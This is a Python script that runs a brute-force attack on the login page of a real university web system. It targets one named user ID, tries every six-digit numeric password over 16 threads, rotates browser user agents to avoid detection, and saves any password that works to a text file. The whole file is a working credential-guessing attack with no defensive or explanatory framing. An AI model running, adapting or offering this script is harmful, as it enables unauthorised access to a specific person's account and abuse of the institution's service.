import re
import requests
from multiprocessing.dummy import Pool as ThreaderPool
import random
from time import sleep



def decipher_url(password):


    url="http://wljx.zjut.edu.cn/homepage/common/login.jsp"
    #print("grabing: " + form_data)'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36'



    agents=['Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
            'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25',
            'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.2 (KHTML, like Gecko) Chrome/22.0.1216.0 Safari/537.2',
            'Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/16.0.1',
            'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:15.0) Gecko/20100101 Firefox/15.0.1']

    random_userAgent = random.choice(agents)
    data = {"user-agent": random_userAgent, "IPT_LOGINUSERNAME": "004266", "IPT_LOGINPASSWORD": password}

    content=""

    while content=="":

        try:
            r= requests.post(url=url,data=data)
            #requests.adapters.DEFAULT_RETRIES = 5

            content=r.text
            #print(content)
            reg=r'<span>.*</span>'
            re.compile(reg)
            matches=re.search(reg,content)

            if matches is not None:
                print(matches)
                print("  wow  "+password)
                datas=[]
                datas.append("username: "+"004266, password: "+password+"\n")
                save_to_txt("wljx",datas)
            else:
                print('d ')

        except:
            #print("Connection refused by the server..")
            #print("Let me sleep for 5 seconds")
            print("ZZzzzz...")
            sleep(5)
            #print("Was a nice sleep, now let me continue...")
            continue



def generate_password():

    passwords=[]
    num_1=0
    num_2=0
    num_3=0
    num_4=0
    num_5=0
    num_6=0
    while num_1<=9:
        while num_2<=9:
            while num_3<=9:
                while num_4 <= 9:
                    while num_5 <= 9:
                        while num_6 <= 9:
                            password=str(num_1)+str(num_2)+str(num_3)+str(num_4)+str(num_5)+str(num_6)
                            passwords.append(password)
                            num_6+=1
                        num_5+=1
                        num_6=0
                    num_4+=1
                    num_5=0
                    num_6=0
                num_3+=1
                num_4=0
                num_5=0
                num_6=0
            num_2+=1
            num_3=0
            num_4 = 0
            num_5 = 0
            num_6 = 0
        num_1+=1
        num_2=0
        num_3 = 0
        num_4 = 0
        num_5 = 0
        num_6 = 0



    return passwords


def save_to_txt(fname,datas):

    f=open(fname,'a+')
    #for i in range(0,len(datas)):
    f.writelines(datas)
    f.close()



def main():

   passwords=generate_password()

   tpool = ThreaderPool(processes=16)
   results = tpool.map(decipher_url, passwords)
   tpool.close()
   tpool.join()



if __name__=="__main__":
    main()